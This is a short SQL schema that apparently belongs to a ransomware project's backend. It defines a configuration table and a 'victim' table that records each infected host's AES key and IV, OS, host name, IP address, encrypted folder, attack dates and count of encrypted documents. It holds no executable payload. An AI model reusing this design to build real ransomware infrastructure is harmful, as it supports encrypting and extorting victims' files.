CREATE TABLE configuration (
    id VARCHAR(255) NOT NULL PRIMARY KEY,
    val VARCHAR(255) NOT NULL
);

CREATE TABLE victim (
    id VARCHAR(255) NOT NULL PRIMARY KEY,
    aes_key VARCHAR(255),
    aes_iv VARCHAR(255),
    os VARCHAR(255),
    os_version VARCHAR(255),
    host_name VARCHAR(255),
    ip_address VARCHAR(255),
    encrypted_folder VARCHAR(255) NOT NULL,
    effective_encrypted_folder VARCHAR(255),
    start_attack_date DATETIME NOT NULL,
    end_attack_date DATETIME,
    tot_docs_encrypted INT,
    error VARCHAR(65535));